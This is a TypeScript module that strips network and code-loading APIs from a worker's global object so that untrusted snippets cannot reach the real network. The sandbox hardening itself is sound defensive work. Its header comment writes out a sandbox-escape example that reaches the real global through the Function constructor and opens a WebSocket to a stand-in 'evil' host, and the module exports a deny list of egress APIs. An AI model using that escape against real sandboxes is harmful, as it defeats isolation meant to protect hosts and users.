/**
 * Worker-realm egress hardening (SEC-01/04/30/34) — run ONCE at worker bootstrap,
 * before any untrusted snippet executes.
 *
 * ─── Why this exists (the Function-constructor escape) ──────────────────────
 * `worker-entry.ts` binds the dangerous globals (`globalThis`, `window`,
 * `WebSocket`, `XMLHttpRequest`, `EventSource`, `importScripts`, …) to
 * `undefined` — but ONLY as AsyncFunction PARAMETERS of the snippet wrapper.
 * Parameter shadowing is defeated the moment a snippet reaches the real global
 * by another route. The `Function` constructor is such a route:
 *
 *     const g = Function('return this')();   // the worker's REAL globalThis
 *     new g.WebSocket('wss://evil');         // live socket — egress escape
 *
 * We deliberately do NOT delete the `Function` constructor itself (snippets
 * legitimately define functions, and core/esbuild-bundled deps may build
 * functions dynamically). Instead we remove the *capabilities* `Function('return
 * this')()` could reach: every real-egress / remote-code-load API on the worker
 * global. After this runs, `Function('return this')().WebSocket` (and the rest)
 * resolve to `undefined`, so the escape reaches nothing.
 *
 * The simulator `fetch` shim (`globalThis.fetch = simFetch`, installed by the
 * worker-main entries) is intentionally PRESERVED — it is the only "network" a
 * snippet is allowed to see, and it opens no real socket. `fetch` is therefore
 * NOT in the removal list below; hardening runs before the shim is installed OR
 * leaves an already-installed shim untouched (it only touches the named egress
 * capabilities).
 *
 * Isolation note: this is defense against the in-realm escape, layered under the
 * CSP `connect-src 'self'` backstop (SEC-10..13). A worker_threads worker is not
 * a hard host-isolation boundary (see worker-main.node.ts) — this closes the
 * ambient-authority egress surface that IS reachable in both tiers.
 */

/**
 * The real-egress / remote-code-load capabilities we neutralize on the worker
 * global. Each is either a live network transport, a way to load & run remote
 * code, or a way to spawn another (un-hardened) realm. Removing them means the
 * `Function('return this')()` escape yields inert `undefined`s.
 *
 * Exported so the security regression test asserts against the SAME list the
 * bootstrap enforces (no drift between "what we remove" and "what we test").
 */
export const EGRESS_CAPABILITY_NAMES = [
    // Live network transports / raw-socket egress.
    'WebSocket',
    'XMLHttpRequest',
    'EventSource',
    'WebTransport',
    'RTCPeerConnection',
    // Remote-code load inside the worker realm.
    'importScripts',
    // Spawning a fresh (un-hardened) realm that could re-reach these.
    'Worker',
    'SharedWorker',
    'ServiceWorker',
    'BroadcastChannel',
] as const;

/** Delete a property if the host allows it; otherwise blank it to `undefined`. */
function neutralize(obj: Record<string, unknown>, key: string): void {
    if (!(key in obj)) return;
    try {
        // Prefer a real delete so `key in globalThis` also becomes false.
        delete obj[key];
    } catch {
        /* non-configurable — fall through to overwrite */
    }
    if (key in obj) {
        try {
            // Best-effort inert overwrite for non-configurable slots.
            Object.defineProperty(obj, key, {
                value: undefined,
                configurable: true,
                writable: true,
                enumerable: false,
            });
        } catch {
            try {
                obj[key] = undefined;
            } catch {
                /* frozen slot we cannot touch — nothing more we can do here */
            }
        }
    }
}

/**
 * Harden the worker's real `globalThis` against the Function-constructor egress
 * escape. Idempotent and best-effort: a missing capability is skipped, a
 * non-configurable one is blanked to `undefined`. Call ONCE at bootstrap, before
 * any snippet runs and (in the browser entry) before or after the sim-`fetch`
 * shim is installed — it never touches `fetch`.
 *
 * @param g The worker global to harden. Defaults to the ambient `globalThis`.
 */
export function hardenWorkerGlobal(
    g: Record<string, unknown> = globalThis as unknown as Record<
        string,
        unknown
    >,
): void {
    for (const name of EGRESS_CAPABILITY_NAMES) {
        neutralize(g, name);
    }

    // `navigator.sendBeacon` is a real POST egress that ignores CSP `connect-src`
    // in some engines and survives even when the transports above are gone.
    // Neutralize the method without clobbering the whole `navigator` (snippets /
    // core may read benign fields like `navigator.userAgent`).
    const nav = (g as { navigator?: Record<string, unknown> }).navigator;
    if (nav && typeof nav === 'object' && 'sendBeacon' in nav) {
        neutralize(nav, 'sendBeacon');
    }
}

export default hardenWorkerGlobal;
